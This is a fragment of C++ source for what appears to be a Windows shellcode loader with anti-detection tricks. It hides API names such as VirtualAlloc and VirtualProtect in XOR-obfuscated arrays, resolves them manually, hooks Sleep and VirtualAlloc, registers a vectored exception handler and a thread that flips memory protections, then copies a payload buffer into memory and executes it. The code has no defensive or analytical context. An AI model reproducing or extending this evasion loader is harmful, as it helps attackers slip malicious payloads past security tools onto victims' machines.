    char v0[] = { 'V' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'A' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'c' , 0 };
    char v1[] = { 'S' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'p' , 0 };
    char v2[] = { 'V' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'P' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'o' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'c' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' , 0 };
    char v3[] = { 'V' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'i' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 't' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'u' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'a' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'l' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'F' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'r' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' ^ 0x0A , 'p' ^ 0x0A , 'c' ^ 0x0A , 'a' ^ 0x0A , 'e' , 0 };
    g_pVirtualAlloc = (decltype(g_pVirtualAlloc))GetProcAddressManual(hKernel32, extract_every_fourth(v0).c_str());
    g_pSleep = (decltype(g_pSleep))GetProcAddressManual(hKernel32, extract_every_fourth(v1).c_str());
    g_pVirtualProtect = (decltype(g_pVirtualProtect))GetProcAddressManual(hKernel32, extract_every_fourth(v2).c_str());
    g_pVirtualFree = (decltype(g_pVirtualFree))GetProcAddressManual(hKernel32, extract_every_fourth(v3).c_str());
    hookVirtualAlloc();
    hookSleep();
    AddVectoredExceptionHandler(1, PvectoredExceptionHandler);
    hEvent = CreateEventA(nullptr, TRUE, FALSE, nullptr);
    CreateThread(nullptr, 0, SetNoExecutable, nullptr, 0, nullptr);
    LPVOID exec_mem = g_pVirtualAlloc(nullptr, result.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec_mem, result.data(), result.size());
    shellcode_addr = exec_mem;
    Vir_FLAG = true;
    (*(int(*)()) exec_mem)();
    unhookVirtualAlloc();
    unhookSleep();
    return 0;
}